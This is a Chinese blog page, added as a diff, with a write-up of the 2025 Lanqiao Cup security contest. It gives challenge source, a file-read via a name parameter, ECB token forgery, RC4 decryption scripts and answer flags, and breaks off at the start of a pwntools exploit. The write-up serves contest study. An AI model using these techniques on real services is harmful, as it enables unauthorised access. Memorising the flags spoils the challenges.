@@ -1,0 +1,759 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412222328446.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="XU17">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="2025年第十六届蓝桥杯网络安全赛项Writeup情报收集黑客密室逃脱1&#x2F;file?name&#x3D;app.py   123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import osfrom flask import">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XU17">
+<meta property="og:url" content="https://xu17.top/2025/04/26/2025%E5%B9%B4%E7%AC%AC%E5%8D%81%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A1%B9Writeup/index.html">
+<meta property="og:site_name" content="XU17">
+<meta property="og:description" content="2025年第十六届蓝桥杯网络安全赛项Writeup情报收集黑客密室逃脱1&#x2F;file?name&#x3D;app.py   123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import osfrom flask import">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261012817.png">
+<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261013752.png">
+<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504260950238.png">
+<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261305690.png">
+<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261304506.png">
+<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261308521.png">
+<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261208376.png">
+<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261317201.png">
+<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261324369.png">
+<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261314675.png">
+<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261212458.png">
+<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504260909631.png">
+<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261030562.png">
+<meta property="article:published_time" content="2025-04-26T07:06:02.413Z">
+<meta property="article:modified_time" content="2025-04-26T07:08:25.094Z">
+<meta property="article:author" content="XU17">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261012817.png">
+  
+  
+  
+  <title>XU17</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xu17.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"Hh0qQAnE7Hsu4FeGu84fiWVS-gzGzoHsz","app_key":"wRTMLUJSKcLNxEGBSEvSGJ4x","server_url":"https://hh0qqane.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>XU17&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412281014683.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-26 15:06" pubdate>
+          2025年4月26日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          924 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          8 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="2025年第十六届蓝桥杯网络安全赛项Writeup"><a href="#2025年第十六届蓝桥杯网络安全赛项Writeup" class="headerlink" title="2025年第十六届蓝桥杯网络安全赛项Writeup"></a>2025年第十六届蓝桥杯网络安全赛项Writeup</h1><h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><h3 id="黑客密室逃脱"><a href="#黑客密室逃脱" class="headerlink" title="黑客密室逃脱"></a>黑客密室逃脱</h3><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">/<span class="hljs-keyword">file</span>?<span class="hljs-keyword">name</span>=app.py<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261012817.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template<br><span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># author: gamelab</span><br><br>app = Flask(__name__)<br><br><span class="hljs-comment"># 模拟敏感信息</span><br>sensitive_info = SENSITIVE_INFO<br><br><span class="hljs-comment"># 加密密钥</span><br>encryption_key = ENCRYPTION_KEY<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">simple_encrypt</span>(<span class="hljs-params">text, key</span>):<br>    encrypted = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(text)):<br>        char = text[i]<br>        key_char = key[i % <span class="hljs-built_in">len</span>(key)]<br>        encrypted.append(<span class="hljs-built_in">ord</span>(char) + <span class="hljs-built_in">ord</span>(key_char))<br>    <span class="hljs-keyword">return</span> encrypted.<span class="hljs-built_in">hex</span>()<br><br>encrypted_sensitive_info = simple_encrypt(sensitive_info, encryption_key)<br><br><span class="hljs-comment"># 模拟日志文件内容</span><br>log_content = <span class="hljs-string">f&quot;用户访问了 /secret 页面，可能试图获取 <span class="hljs-subst">&#123;encrypted_sensitive_info&#125;</span>&quot;</span><br><br><span class="hljs-comment"># 模拟隐藏文件内容</span><br>hidden_file_content = <span class="hljs-string">f&quot;解密密钥: <span class="hljs-subst">&#123;encryption_key&#125;</span>&quot;</span><br><br><span class="hljs-comment"># 指定安全的文件根目录</span><br>SAFE_ROOT_DIR = os.path.abspath(<span class="hljs-string">&#x27;/app&#x27;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(os.path.join(SAFE_ROOT_DIR, <span class="hljs-string">&#x27;hidden.txt&#x27;</span>), <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(hidden_file_content)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logs&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logs</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;logs.html&#x27;</span>, log_content=log_content)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/secret&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">secret</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;secret.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">file</span>():<br>    file_name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_name:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;no_file_name.html&#x27;</span>)<br>    full_path = os.path.abspath(os.path.join(SAFE_ROOT_DIR, file_name))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> full_path.startswith(SAFE_ROOT_DIR) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;config&#x27;</span> <span class="hljs-keyword">in</span> full_path:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;no_premission.html&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(full_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            content = f.read()<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;file_content.html&#x27;</span>, content=content)<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;file_not_found.html&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+
+<p>访问<code>/name=hidden.txt</code></p>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261013752.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">simple_decrypt</span>(<span class="hljs-params">hex_str, key</span>):<br><br>    encrypted = <span class="hljs-built_in">bytes</span>.fromhex(hex_str)<br><br>    decrypted = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encrypted)):<br><br>        key_char = key[i % <span class="hljs-built_in">len</span>(key)]<br><br>        decrypted.append(<span class="hljs-built_in">chr</span>(encrypted[i] - <span class="hljs-built_in">ord</span>(key_char)))<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(decrypted)<br><br>  <br><br>encrypted_data = <span class="hljs-string">&quot;d9d1c4d9e0aa96cec7ad9d9c6f60abc79ad792a898ce9ca671729e94a0cac6ab97a8c4cdcbae709d6bb0&quot;</span><br><br>encryption_key = <span class="hljs-string">&quot;secret_key9993&quot;</span><br><br>  <br><br>flag = simple_decrypt(encrypted_data, encryption_key)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密后的Flag:&quot;</span>, flag)<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h2><h3 id="ezEvtx"><a href="#ezEvtx" class="headerlink" title="ezEvtx"></a>ezEvtx</h3><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504260950238.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h3 id="flowzip"><a href="#flowzip" class="headerlink" title="flowzip"></a>flowzip</h3><p>全局搜索字节流flag<br><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261305690.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261304506.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;c6db63e6-<span class="hljs-number">6459</span>-<span class="hljs-number">4</span>e75-bb37-<span class="hljs-number">3</span>aec5d2b947b&#125;<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><h3 id="Enigma"><a href="#Enigma" class="headerlink" title="Enigma"></a>Enigma</h3><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261308521.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h3 id="ECBTrain"><a href="#ECBTrain" class="headerlink" title="ECBTrain"></a>ECBTrain</h3><p>注册两个账户，第一个带有admin，用第一个的一半去base64伪造</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(base64.b64encode(b<span class="hljs-string">&#x27;\xd6\xda\xe8Q\x86\x15\xf8&quot;!\x97  \x18N\x1b\xb2&#x27;</span>)</span></span><span class="hljs-selector-class">.decode</span>())<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261208376.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><h3 id="ShadowPhases"><a href="#ShadowPhases" class="headerlink" title="ShadowPhases"></a>ShadowPhases</h3><ul>
+<li>IDA打断点动调<br><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261317201.png" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+</ul>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">0</span>fa830e7-b699-<span class="hljs-number">4513</span>-<span class="hljs-number">8</span>e01-<span class="hljs-number">51</span>f35b0f3293&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="BashBreaker"><a href="#BashBreaker" class="headerlink" title="BashBreaker"></a>BashBreaker</h3><p>博弈树哈哈<br><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261324369.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><code>EC3700DFCD4F364EC54B19C5E7E26DEF6A25087C4FCDF4F8507A40A9019E3B48BD70129D0141A5B8F089F280F4BE6CCD</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RC4Context</span>:<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br><br>        <span class="hljs-variable language_">self</span>.S = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">256</span>)<br><br>        <span class="hljs-variable language_">self</span>.i = <span class="hljs-number">0</span><br><br>        <span class="hljs-variable language_">self</span>.j = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init</span>(<span class="hljs-params">ctx, key</span>):<br><br>    key_length = <span class="hljs-built_in">len</span>(key)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br><br>        ctx.S[i] = i<br><br>    j = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br><br>        j = ((key[i % key_length] ^ <span class="hljs-number">0x37</span>) + ctx.S[i] + j) % <span class="hljs-number">256</span><br><br>        ctx.S[i], ctx.S[j] = ctx.S[j], ctx.S[i]<br><br>    ctx.i = <span class="hljs-number">0</span><br><br>    ctx.j = ctx.i<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_next</span>(<span class="hljs-params">ctx</span>):<br><br>    ctx.i = (ctx.i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br><br>    ctx.j = (ctx.j + ctx.S[ctx.i]) % <span class="hljs-number">256</span><br><br>    ctx.S[ctx.i], ctx.S[ctx.j] = ctx.S[ctx.j], ctx.S[ctx.i]<br><br>    v2 = ctx.S[(ctx.S[ctx.i] + ctx.S[ctx.j]) % <span class="hljs-number">256</span>]<br><br>    <span class="hljs-keyword">return</span> ((v2 &lt;&lt; <span class="hljs-number">4</span>) | (v2 &gt;&gt; <span class="hljs-number">4</span>)) &amp; <span class="hljs-number">0xFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">key, ciphertext</span>):<br><br>    ctx = RC4Context()<br><br>    rc4_init(ctx, key)<br><br>    plaintext = <span class="hljs-built_in">bytearray</span>(<span class="hljs-built_in">len</span>(ciphertext))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ciphertext)):<br><br>        plaintext[i] = ciphertext[i] ^ rc4_next(ctx)<br><br>    <span class="hljs-keyword">return</span> plaintext.decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><br>    key = <span class="hljs-string">b&quot;EC3700DFCD4F364EC54B19C5E7E26DEF6A25087C4FCDF4F8507A40A9019E3B48BD70129D0141A5B8F089F280F4BE6CCD&quot;</span><br><br>    ciphertext_hex = <span class="hljs-string">&quot;BBCA1214D0F199A79148C32873ADB7758C89CDDD2D505D7F95B1A49D0943E1D2E966EA1898C6CC023918&quot;</span><br><br>    ciphertext = <span class="hljs-built_in">bytes</span>.fromhex(ciphertext_hex)<br><br>    plaintext = decrypt(key, ciphertext)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decrypted: <span class="hljs-subst">&#123;plaintext&#125;</span>&quot;</span>)<br><br>  <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><br>    main()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261314675.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="漏洞挖掘分析"><a href="#漏洞挖掘分析" class="headerlink" title="漏洞挖掘分析"></a>漏洞挖掘分析</h2><h3 id="RuneBreach"><a href="#RuneBreach" class="headerlink" title="RuneBreach"></a>RuneBreach</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构和调试环境</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;start&quot;</span>, <span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;wsl.exe&quot;</span>, <span class="hljs-string">&quot;-e&quot;</span>]<br><br><span class="hljs-comment"># 